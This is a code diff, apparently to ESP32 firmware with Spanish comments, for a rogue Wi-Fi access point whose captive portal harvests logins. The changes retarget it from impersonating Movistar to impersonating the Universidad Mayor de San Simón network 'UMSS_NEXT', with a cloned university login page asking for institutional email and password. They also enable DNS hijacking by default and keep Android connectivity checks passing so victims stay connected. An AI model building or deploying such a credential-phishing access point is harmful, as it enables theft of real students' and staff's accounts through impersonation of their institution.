@@ -48,7 +48,7 @@ CAPTIVE PORTAL AUTO-POPUP:
 const char* SSID_REAL = SSID_REAL_CFG;
 const char* PASS_REAL = PASS_REAL_CFG;
 
-const char* SSID_FAKE = "MOVISTAR_Guest";
+const char* SSID_FAKE = "UMSS_NEXT";
 const char* PASS_FAKE = "12345678";
 
 const IPAddress IP_AP  (192, 168, 4, 1);
@@ -61,7 +61,7 @@ const IPAddress DNS_UPSTREAM(8, 8, 8, 8);
 // Si true: el cliente tiene internet desde el inicio (repetidor puro, el portal
 // no se fuerza). Si false: primero secuestra DNS (portal salta) y abre internet
 // tras capturar credenciales. Cambia a true si solo quieres probar el enrutado.
-#define ABRIR_INTERNET_AL_INICIO   true    // true = internet directo (la version que SI funciona)
+#define ABRIR_INTERNET_AL_INICIO   false   // false = modo portal (iOS abre el login automatico)
 
 // ============================================================================
 // PINES
@@ -493,34 +493,38 @@ const char HTML_PORTAL[] PROGMEM = R"====(
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>MOVISTAR - Iniciar sesión</title>
+<title>UMSS · Acceso a la red</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:Arial,sans-serif;background:linear-gradient(160deg,#009de0,#004a80);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-.c{background:#fff;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.35);padding:40px 32px;max-width:400px;width:100%}
-.logo{font-size:28px;font-weight:900;color:#009de0;text-align:center;margin-bottom:4px}
-.logo span{color:#004a80}
-.sub{text-align:center;color:#666;font-size:13px;margin-bottom:28px}
-label{font-size:13px;font-weight:700;color:#444;display:block;margin-bottom:5px;margin-top:14px}
-input{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:15px}
-input:focus{outline:none;border-color:#009de0}
-.btn{margin-top:22px;width:100%;padding:14px;background:#009de0;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
-.btn:hover{background:#004a80}
-.ft{text-align:center;font-size:11px;color:#bbb;margin-top:20px}
+body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(160deg,#38286B,#241646);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.c{background:#fff;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.4);padding:30px 26px;max-width:400px;width:100%}
+.logo-umss{display:flex;justify-content:center;margin-bottom:14px}
+.logo-umss svg{height:100px;width:auto;display:block}
+.u{text-align:center;color:#38286B;font-size:15px;font-weight:800;line-height:1.25}
+.red{text-align:center;color:#C12E36;font-size:12px;font-weight:700;margin-top:3px;letter-spacing:.02em}
+.sub{text-align:center;color:#666;font-size:12.5px;margin:14px 0 22px;line-height:1.5}
+label{font-size:12.5px;font-weight:700;color:#333;display:block;margin-bottom:5px;margin-top:14px}
+input{width:100%;padding:12px 14px;border:1.5px solid #cfd8e3;border-radius:8px;font-size:15px}
+input:focus{outline:none;border-color:#38286B}
+.btn{margin-top:22px;width:100%;padding:14px;background:#38286B;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
+.btn:hover{background:#241646}
+.ft{text-align:center;font-size:10.5px;color:#9aa7b8;margin-top:20px;line-height:1.5}
 </style>
 </head>
 <body>
 <div class="c">
-  <div class="logo">M <span>movistar</span></div>
-  <div class="sub">Verifica tu identidad para continuar</div>
+  <div class="logo-umss"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px" width="674.184px" height="1023.071px" viewBox="0 0 674.184 1023.071" xml:space="preserve"><g id="Capa_8" display="none"><g display="inline"><polygon fill="#FFFFFF" points="559.449,174.107 337.09,848.964 114.734,174.107 "/></g><g display="inline"><polygon fill="#C12E36" points="337.092,319.69 558.599,175.13 479.212,417.625 "/><polygon fill="#C12E36" points="337.092,319.69 114.733,174.575 194.97,417.626 "/><polygon fill="none" stroke="#352566" stroke-width="6" stroke-miterlimit="10" points="559.45,174.107 337.09,848.964 114.733,174.107 "/><g><polygon fill="#38286B" points="358.833,383.34 372.3,424.785 337.045,450.398 301.79,424.785 315.256,383.34 "/><g><g><line fill="none" stroke="#352566" stroke-width="4" stroke-miterlimit="10" x1="370.3" y1="424.785" x2="302.918" y2="593.785"/><g><polygon fill="#352566" points="298.203,586.786 295.044,613.536 311.157,591.95 "/></g></g></g><g><g><line fill="none" stroke="#352566" stroke-width="4" stroke-miterlimit="10" x1="303.79" y1="424.804" x2="371.255" y2="593.77"/><g><polygon fill="#352566" points="363.017,591.94 379.14,613.517 375.968,586.768 "/></g></g></g><g><g><line fill="none" stroke="#352566" stroke-width="4" stroke-miterlimit="10" x1="337.045" y1="449.398" x2="337.045" y2="706.273"/><g><polygon fill="#352566" points="330.072,701.518 337.045,727.536 344.018,701.518 "/></g></g></g><polygon fill="#FFFFFF" points="327.95,425.216 322.948,409.821 336.044,400.307 349.14,409.821 344.138,425.216 "/><polygon fill="#0F5A96" points="337.045,394.784 358.845,383.324 354.679,407.598 372.315,424.788 347.944,428.33 337.045,450.414 326.146,428.33 301.773,424.788 319.41,407.598 315.246,383.324 "/><polygon fill="#FFFFFF" points="326.174,428.317 319.438,407.584 337.073,394.77 354.71,407.584 347.974,428.317 "/></g><g><path fill="#38286B" d="M255.003,190.786h13.957v26.971c0,2.675-0.417,5.2-1.25,7.576s-2.141,4.454-3.922,6.233 s-3.649,3.029-5.604,3.749c-2.717,1.008-5.98,1.512-9.789,1.512c-2.203,0-4.606-0.154-7.21-0.463 c-2.604-0.309-4.781-0.92-6.531-1.836c-1.75-0.915-3.351-2.217-4.802-3.903s-2.445-3.425-2.98-5.215 c-0.864-2.88-1.297-5.432-1.297-7.653v-26.971h13.958v27.613c0,2.469,0.684,4.396,2.054,5.785 c1.369,1.389,3.268,2.082,5.697,2.082c2.409,0,4.297-0.684,5.667-2.052c1.369-1.367,2.054-3.306,2.054-5.815V190.786z"/></g><g><path fill="#38286B" d="M286.459,191.172h18.396l7.095,27.544l7.044-27.544h18.385v45.269h-11.456v-34.523l-8.827,34.523h-10.37 l-8.811-34.523v34.523h-11.456V191.172z"/></g><g><path fill="#38286B" d="M354.758,221.464l13.31-0.833c0.288,2.162,0.874,3.809,1.76,4.94c1.44,1.833,3.499,2.749,6.176,2.749 c1.996,0,3.536-0.468,4.616-1.405c1.081-0.937,1.621-2.022,1.621-3.258c0-1.173-0.515-2.223-1.544-3.149 s-3.417-1.801-7.164-2.625c-6.135-1.379-10.509-3.211-13.123-5.496c-2.636-2.285-3.953-5.198-3.953-8.739 c0-2.326,0.675-4.524,2.023-6.593c1.348-2.069,3.376-3.695,6.083-4.879c2.706-1.184,6.417-1.776,11.132-1.776 c5.784,0,10.194,1.076,13.231,3.227c3.036,2.151,4.843,5.574,5.419,10.267l-13.185,0.772c-0.351-2.038-1.087-3.521-2.208-4.447 c-1.122-0.926-2.671-1.39-4.647-1.39c-1.627,0-2.852,0.345-3.675,1.035c-0.823,0.69-1.235,1.528-1.235,2.517 c0,0.721,0.34,1.369,1.02,1.945c0.658,0.597,2.223,1.153,4.693,1.667c6.114,1.317,10.493,2.651,13.139,3.999 s4.57,3.021,5.774,5.018c1.205,1.997,1.807,4.23,1.807,6.701c0,2.903-0.803,5.579-2.408,8.029 c-1.605,2.45-3.85,4.308-6.731,5.574c-2.883,1.266-6.516,1.899-10.9,1.899c-7.7,0-13.031-1.482-15.996-4.447 C356.827,229.802,355.148,226.035,354.758,221.464z"/></g><g><path fill="#38286B" d="M411.332,221.464l13.31-0.833c0.288,2.162,0.874,3.809,1.76,4.94c1.44,1.833,3.499,2.749,6.176,2.749 c1.996,0,3.536-0.468,4.616-1.405c1.081-0.937,1.621-2.022,1.621-3.258c0-1.173-0.515-2.223-1.544-3.149 s-3.417-1.801-7.164-2.625c-6.135-1.379-10.509-3.211-13.123-5.496c-2.636-2.285-3.953-5.198-3.953-8.739 c0-2.326,0.675-4.524,2.023-6.593c1.348-2.069,3.376-3.695,6.083-4.879c2.706-1.184,6.417-1.776,11.132-1.776 c5.784,0,10.194,1.076,13.231,3.227c3.036,2.151,4.843,5.574,5.419,10.267l-13.185,0.772c-0.351-2.038-1.087-3.521-2.208-4.447 c-1.122-0.926-2.671-1.39-4.647-1.39c-1.627,0-2.852,0.345-3.675,1.035c-0.823,0.69-1.235,1.528-1.235,2.517 c0,0.721,0.34,1.369,1.02,1.945c0.658,0.597,2.223,1.153,4.693,1.667c6.114,1.317,10.493,2.651,13.139,3.999 s4.57,3.021,5.774,5.018c1.205,1.997,1.807,4.23,1.807,6.701c0,2.903-0.803,5.579-2.408,8.029 c-1.605,2.45-3.85,4.308-6.731,5.574c-2.883,1.266-6.516,1.899-10.9,1.899c-7.7,0-13.031-1.482-15.996-4.447 C413.401,229.802,411.723,226.035,411.332,221.464z"/></g></g></g><g id="Capa_8_copia"><g><polygon fill="#FFFFFF" points="669.702,6.798 337.09,1016.273 4.481,6.798 "/></g><g><polygon fill="#C12E36" points="337.092,220.988 668.751,4.542 549.887,367.624 "/><polygon fill="#C12E36" points="337.092,220.988 4.159,3.709 124.295,367.625 "/><path fill="#352566" d="M337.089,1023.071L0,0h674.184L337.089,1023.071z M8.316,6.017l328.772,997.828L665.867,6.017H8.316z"/><g><path fill="#352566" d="M337.056,418.757l-55.144-40.063l21.063-64.827h68.161l21.064,64.827L337.056,418.757z M286.628,377.161 l50.428,36.639l50.43-36.639l-19.264-59.282H305.89L286.628,377.161z"/><g><rect x="334.142" y="367.314" transform="matrix(0.9264 0.3764 -0.3764 0.9264 217.1857 -88.9269)" fill="#352566" width="4.011" height="287.952"/><g><polygon fill="#352566" points="277.234,638.168 273.892,664.971 290.188,643.432 "/></g></g><g><rect x="194.129" y="509.23" transform="matrix(0.3774 0.9261 -0.9261 0.3774 683.9352 5.1938)" fill="#352566" width="287.951" height="4.011"/><g><polygon fill="#352566" points="384.166,642.788 400.487,664.309 397.115,637.51 "/></g></g><g><rect x="335.087" y="415.805" fill="#352566" width="4.011" height="402.006"/><g><polygon fill="#352566" points="330.101,813.043 337.092,839.131 344.085,813.043 "/></g></g><g><path fill="#352566" d="M337.059,418.351l-12.916-39.753h-41.802l33.816-24.571l-12.917-39.753l33.816,24.569l33.813-24.569 l-12.914,39.754l33.816,24.57h-41.799L337.059,418.351z M328.758,378.598l8.301,25.543l8.298-25.543H328.758z M351.403,374.208 h26.856l-21.729-15.789L351.403,374.208z M327.332,374.208h19.45l6.014-18.502l-15.739-11.436l-15.737,11.435L327.332,374.208z M322.716,374.208l-5.131-15.789l-21.731,15.789H322.716z M340.792,341.557l13.429,9.758l8.301-25.546L340.792,341.557z M311.593,325.769l8.3,25.545l13.43-9.757L311.593,325.769z"/></g></g><g><path fill="#38286B" d="M214.183,27.981h20.897v40.382c0,4.005-0.625,7.787-1.871,11.345c-1.249,3.557-3.208,6.668-5.874,9.333 c-2.665,2.664-5.463,4.536-8.392,5.614c-4.066,1.509-8.955,2.263-14.656,2.263c-3.298,0-6.896-0.23-10.795-0.693 c-3.9-0.462-7.16-1.377-9.779-2.749c-2.621-1.37-5.018-3.32-7.191-5.844c-2.172-2.526-3.659-5.128-4.46-7.809 c-1.293-4.311-1.942-8.133-1.942-11.459V27.981h20.898v41.344c0,3.697,1.024,6.583,3.075,8.663 c2.051,2.08,4.893,3.119,8.53,3.119c3.605,0,6.435-1.025,8.484-3.074c2.049-2.046,3.075-4.948,3.075-8.708V27.981z"/></g><g><path fill="#38286B" d="M261.28,28.559h27.544L299.448,69.8l10.546-41.241h27.527V96.34h-17.153V44.648L307.152,96.34h-15.528 l-13.188-51.691V96.34H261.28V28.559z"/></g><g><path fill="#38286B" d="M363.542,73.916l19.93-1.249c0.431,3.238,1.307,5.704,2.636,7.398c2.156,2.743,5.237,4.116,9.247,4.116 c2.988,0,5.293-0.702,6.91-2.105c1.618-1.402,2.426-3.028,2.426-4.877c0-1.757-0.77-3.329-2.311-4.716 c-1.54-1.387-5.116-2.696-10.727-3.931c-9.186-2.064-15.735-4.809-19.648-8.229c-3.949-3.421-5.92-7.783-5.92-13.083 c0-3.484,1.009-6.774,3.028-9.872c2.02-3.098,5.056-5.533,9.11-7.305c4.052-1.772,9.608-2.658,16.667-2.658 c8.66,0,15.266,1.61,19.812,4.832c4.545,3.22,7.25,8.344,8.112,15.371l-19.74,1.158c-0.524-3.052-1.627-5.271-3.304-6.658 c-1.68-1.387-4.002-2.081-6.96-2.081c-2.436,0-4.271,0.517-5.503,1.549c-1.231,1.034-1.85,2.289-1.85,3.768 c0,1.079,0.509,2.049,1.525,2.913c0.987,0.894,3.329,1.727,7.029,2.497c9.153,1.972,15.712,3.969,19.671,5.988 c3.962,2.018,6.844,4.523,8.648,7.513c1.804,2.99,2.703,6.334,2.703,10.033c0,4.348-1.202,8.354-3.604,12.022 c-2.406,3.668-5.764,6.449-10.08,8.345c-4.316,1.895-9.755,2.843-16.321,2.843c-11.528,0-19.512-2.219-23.949-6.658 C366.643,86.399,364.128,80.758,363.542,73.916z"/></g><g><path fill="#38286B" d="M448.25,73.916l19.928-1.249c0.433,3.238,1.31,5.704,2.638,7.398c2.156,2.743,5.237,4.116,9.244,4.116 c2.987,0,5.294-0.702,6.913-2.105c1.616-1.402,2.426-3.028,2.426-4.877c0-1.757-0.771-3.329-2.309-4.716 c-1.543-1.387-5.118-2.696-10.729-3.931c-9.187-2.064-15.735-4.809-19.65-8.229c-3.943-3.421-5.92-7.783-5.92-13.083 c0-3.484,1.013-6.774,3.034-9.872c2.016-3.098,5.052-5.533,9.104-7.305c4.053-1.772,9.61-2.658,16.67-2.658 c8.66,0,15.262,1.61,19.811,4.832c4.545,3.22,7.253,8.344,8.115,15.371l-19.741,1.158c-0.527-3.052-1.628-5.271-3.308-6.658 c-1.681-1.387-3.999-2.081-6.959-2.081c-2.436,0-4.27,0.517-5.501,1.549c-1.231,1.034-1.85,2.289-1.85,3.768 c0,1.079,0.509,2.049,1.524,2.913c0.987,0.894,3.33,1.727,7.03,2.497c9.153,1.972,15.71,3.969,19.67,5.988 c3.963,2.018,6.845,4.523,8.646,7.513c1.803,2.99,2.706,6.334,2.706,10.033c0,4.348-1.204,8.354-3.607,12.022 c-2.402,3.668-5.765,6.449-10.079,8.345c-4.314,1.895-9.755,2.843-16.317,2.843c-11.532,0-19.512-2.219-23.953-6.658 C451.351,86.399,448.834,80.758,448.25,73.916z"/></g></g></g><g id="Capa_2"></g></svg></div>
+  <div class="u">Universidad Mayor de San Simón</div>
+  <div class="red">Red inalámbrica institucional · UMSS_NEXT</div>
+  <div class="sub">Inicia sesión con tu correo institucional para acceder a Internet.</div>
   <form method="POST" action="/submit">
-    <label>Correo o usuario</label>
-    <input type="text" name="usuario" placeholder="usuario@movistar.com" required autocomplete="off">
+    <label>Correo institucional</label>
+    <input type="email" name="usuario" placeholder="usuario@est.umss.edu" required autocomplete="off">
     <label>Contraseña</label>
-    <input type="password" name="contrasena" placeholder="••••••••" required>
-    <button class="btn" type="submit">Conectar</button>
+    <input type="password" name="contrasena" placeholder="Contraseña" required>
+    <button class="btn" type="submit">Acceder a la red</button>
   </form>
-  <div class="ft">Red segura · Movistar Bolivia</div>
+  <div class="ft">Dirección de Tecnologías de Información y Comunicación<br>UMSS · Cochabamba – Bolivia</div>
 </div>
 </body>
 </html>
@@ -532,24 +536,25 @@ const char HTML_EXITO[] PROGMEM = R"====(
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Conectado</title>
+<title>UMSS · Conectado</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:Arial,sans-serif;background:linear-gradient(160deg,#009de0,#004a80);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-.c{background:#fff;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.35);padding:40px 32px;max-width:400px;width:100%;text-align:center}
-.ok{font-size:60px;margin-bottom:16px}
-h2{color:#009de0;font-size:22px;margin-bottom:10px}
-p{color:#666;font-size:14px;line-height:1.6}
-.logo{font-size:20px;font-weight:900;color:#009de0;margin-top:24px}
-.logo span{color:#004a80}
+body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(160deg,#0a3d7a,#06255c);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.c{background:#fff;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.4);padding:36px 30px;max-width:400px;width:100%;text-align:center}
+.ok{font-size:56px;margin-bottom:12px;color:#1e9e5a}
+h2{color:#0a3d7a;font-size:20px;margin-bottom:10px}
+p{color:#666;font-size:13.5px;line-height:1.6}
+.go{display:inline-block;margin-top:22px;padding:12px 24px;background:#0a3d7a;color:#fff;text-decoration:none;border-radius:8px;font-weight:700}
+.logo{font-size:16px;font-weight:800;color:#0a3d7a;margin-top:24px}
 </style>
 </head>
 <body>
 <div class="c">
   <div class="ok">&#10003;</div>
-  <h2>Conectado a Internet</h2>
-  <p>Sesión verificada.<br>Ya puedes navegar.</p>
-  <div class="logo">M <span>movistar</span></div>
+  <h2>Acceso concedido</h2>
+  <p>Sesión verificada correctamente.<br>Espera unos segundos y podrás navegar.</p>
+  <a class="go" href="http://neverssl.com">Continuar a Internet</a>
+  <div class="logo">UMSS · Red institucional</div>
 </div>
 </body>
 </html>
@@ -595,10 +600,11 @@ void handle_gen204() {
   send_redirect("http://192.168.4.1/");
 }
 
-// iOS/macOS: NO devolver "<Success>" → activa el portal automático
+// iOS/macOS: en vez de "<Success>" servimos el PORTAL -> iOS abre la ventana
+// automatica (Captive Network Assistant) mostrando directamente el login.
 void handle_hotspot() {
   log_req();
-  server.send(200, "text/html", "<HTML><HEAD><TITLE>Captive</TITLE></HEAD><BODY>Captive</BODY></HTML>");
+  server.send_P(200, "text/html; charset=UTF-8", HTML_PORTAL);
 }
 
 void handle_ncsi() {
@@ -657,6 +663,37 @@ void dns_responder(IPAddress cip, uint16_t cport, byte* q, int qend, bool con_ip
   dnsUDP.endPacket();
 }
 
+// Dominios de comprobacion de conectividad del SO. En modo portal los
+// resolvemos REAL para que el movil valide "internet OK" y NO se desconecte
+// de la red (asi da tiempo a que se muestre el portal al navegar).
+bool es_dominio_sonda(String d) {
+  d.toLowerCase();
+  static const char* probes[] = {
+    // Dominios de comprobacion que resolvemos REAL para que Android no se
+    // desconecte. NO incluimos los de Apple: asi el iPhone detecta el portal
+    // por HTTP y abre el login automaticamente (iOS es fiable para esto).
+    "connectivitycheck.gstatic.com", "connectivitycheck.android.com",
+    "www.msftconnecttest.com", "www.msftncsi.com"
+  };
+  for (unsigned i = 0; i < sizeof(probes) / sizeof(probes[0]); i++)
+    if (d == probes[i]) return true;
+  return false;
+}
+
+// Resuelve el dominio de verdad (cache o hostByName) y responde al cliente.
+void dns_resolver_real(IPAddress cip, uint16_t cport, byte* q, int qend, const String& dominio, int qtype) {
+  if (qtype != 1) { dns_responder(cip, cport, q, qend, false, IP_AP); return; }  // AAAA -> vacio
+  IPAddress rip;
+  if (dns_cache_buscar(dominio, rip)) { dns_responder(cip, cport, q, qend, true, rip); return; }
+  if (WiFi.hostByName(dominio.c_str(), rip) == 1) {
+    dns_cache_guardar(dominio, rip);
+    dns_responder(cip, cport, q, qend, true, rip);
+    Serial.print("[DNS] "); Serial.print(dominio); Serial.print(" -> "); Serial.println(rip);
+  } else {
+    dns_responder(cip, cport, q, qend, false, IP_AP);
+  }
+}
+
 void dns_loop() {
   int len = dnsUDP.parsePacket();
   if (len <= 0) return;
@@ -672,28 +709,18 @@ void dns_loop() {
   if (qend < 0) return;
 
   if (secuestro_dns) {
-    // Portal: cualquier nombre -> 192.168.4.1 (salta el portal cautivo)
-    dns_responder(cip, cport, q, qend, true, IP_AP);
+    if (es_dominio_sonda(dominio)) {
+      // sonda del SO: resolver real -> el movil valida y NO se desconecta
+      dns_resolver_real(cip, cport, q, qend, dominio, qtype);
+    } else {
+      // todo lo demas -> portal cautivo (192.168.4.1)
+      dns_responder(cip, cport, q, qend, true, IP_AP);
+    }
     return;
   }
 
-  // Internet real: solo consultas A las resolvemos con el resolvedor del sistema
-  if (qtype != 1) {                        // AAAA u otras -> respuesta vacia (usa A)
-    dns_responder(cip, cport, q, qend, false, IP_AP);
-    return;
-  }
-  IPAddress rip;
-  if (dns_cache_buscar(dominio, rip)) {           // cache: respuesta instantanea
-    dns_responder(cip, cport, q, qend, true, rip);
-    return;
-  }
-  if (WiFi.hostByName(dominio.c_str(), rip) == 1) {
-    dns_cache_guardar(dominio, rip);
-    dns_responder(cip, cport, q, qend, true, rip);
-    Serial.print("[DNS] "); Serial.print(dominio); Serial.print(" -> "); Serial.println(rip);
-  } else {
-    dns_responder(cip, cport, q, qend, false, IP_AP);   // no resuelto: vacio
-  }
+  // Modo internet: resolvemos todo de verdad
+  dns_resolver_real(cip, cport, q, qend, dominio, qtype);
 }
 
 // ============================================================================
